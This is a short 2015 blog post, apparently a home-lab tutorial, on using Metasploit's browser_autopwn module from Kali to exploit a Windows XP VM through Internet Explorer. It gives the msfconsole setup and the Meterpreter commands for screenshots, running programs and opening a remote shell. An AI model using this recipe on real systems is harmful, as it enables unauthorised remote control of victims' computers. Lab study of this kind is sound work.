@@ -1,0 +1,17 @@
+---
+layout: post
+title: "(Auto)pwning XP with Kali"
+date: '2015-03-14T00:42:00.002-07:00'
+author: Steven Lavoie
+tags:
+- linux
+- pentesting
+- tutorial
+- kali
+modified_time: '2015-05-30T22:38:38.301-07:00'
+thumbnail: http://3.bp.blogspot.com/-_RrbM223joc/VWqd6Yb--zI/AAAAAAAAUxI/zC018ld30GM/s72-c/Backtrack_logo.JPG
+blogger_id: tag:blogger.com,1999:blog-1636451537745562628.post-623007251183918291
+blogger_orig_url: http://imtryingtoscience.blogspot.com/2015/03/pwning-xp-with-kali.html
+---
+
+<div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-_RrbM223joc/VWqd6Yb--zI/AAAAAAAAUxI/zC018ld30GM/s1600/Backtrack_logo.JPG" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" height="182" src="http://3.bp.blogspot.com/-_RrbM223joc/VWqd6Yb--zI/AAAAAAAAUxI/zC018ld30GM/s320/Backtrack_logo.JPG" width="320" /></a></div>Just some quick notes on exploiting a Windows XP VM at home.<br /><br />I booted WinXP SP3 in a VMWare VM with VMWare Player and set the network to bridge (not the auto-bridging). Then select the network device... Virtual Box Host Adapter if you want your VirtualBox VMs to talk to the VMWare one or your local NIC/Wifi Adapter for your home/local network. Wait to get an IP. I had some issues and had to disconnect the "cable" in the VMWare menu and reconnect.&nbsp;<a href="http://www.sysprobs.com/setup-network-virtualbox-vmware-virtual-machines" rel="nofollow" target="_blank">Some help here</a>&nbsp;for the network setup.<br /><br />In the msfconsole, this is how we'll set up the autopwn:<br /><pre style="background: #000000; color: #d1d1d1;">msfconsole<br />msf<span style="color: #e34adc;">&gt;</span> user <span style="color: #66347b;">auxiliary/server/browser_autopwn</span><br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> LHOST <span style="color: #e34adc;">&lt;</span><span style="color: #904050;">local</span> IP<span style="color: #e34adc;">&gt;</span><br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> URIPATH /<br />msf<span style="color: #e34adc;">&gt;</span> <span style="color: #904050;">set</span> SRVPORT <span style="color: #008c00;">80</span><br /></pre><br />Then visit &lt;local IP&gt; (the IP of your Kali box) in IE and see what happens. I was prompted to install/run an ActiveX control. That required that I download/install Java. I got prompted for an update but denied it. Metasploit opened a Meterpreter session on the Kali box.<br /><br />Type "sessions" to see what meterpreter sessions are available (there will be no msf&gt; prompt).<br /><br />"sessions -i #" drops to an interactive meterpreter shell with the machine<br /><br />"screenshot" captures a screencap and saves it to your local / &nbsp;(type "display /[filename]" to see it)<br /><br />"execute -f explorer" will open an explorer window on the XP machine<br /><br />Type "help" to see all the options. Like "shell" to drop into a CMD shell on the box. To get out of it, just type "exit" and you'll return to the meterpreter shell.
